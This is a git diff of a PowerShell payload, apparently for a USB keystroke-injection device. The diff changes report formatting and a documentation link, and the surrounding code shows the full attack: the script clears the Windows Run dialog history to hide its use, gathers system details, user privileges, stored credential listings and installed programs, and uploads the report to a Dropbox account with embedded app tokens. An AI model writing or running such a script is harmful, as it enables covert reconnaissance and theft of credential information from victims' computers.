@@ -5,7 +5,7 @@ $APP_SECRET = "XXXXXXXXXXXXXXX"
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 
 function Send-ToDropbox {
-  #Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/PowerShell-Functions/Send-ToDropbox/README.md
+  # Documentation: https://github.com/PudgyTurkey/Ducky-Utilities/blob/main/PowerShell-Functions/Send-ToDropbox/README.md
 
   [CmdletBinding()]
   param(
@@ -40,9 +40,9 @@ function Send-ToDropbox {
   }
 }
 
-$Report = "# System Information #`n $(SYSTEMINFO | Out-String)"
-$Report += "`n# User Information #`n $(WHOAMI /ALL | Out-String)"
-$Report += "`n# Stored Credentials #`n $(CMDKEY /LIST | Out-String)"
-$Report += "`n# Installed Programs #`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
+$Report = "*** System Information ***`n $(SYSTEMINFO | Out-String)`n"
+$Report += "*** User Information ***`n $(WHOAMI /ALL | Out-String)`n"
+$Report += "*** Stored Credentials ***`n $(CMDKEY /LIST | Out-String)`n"
+$Report += "*** Installed Programs ***`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
 
 Send-ToDropbox -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET -Content $Report
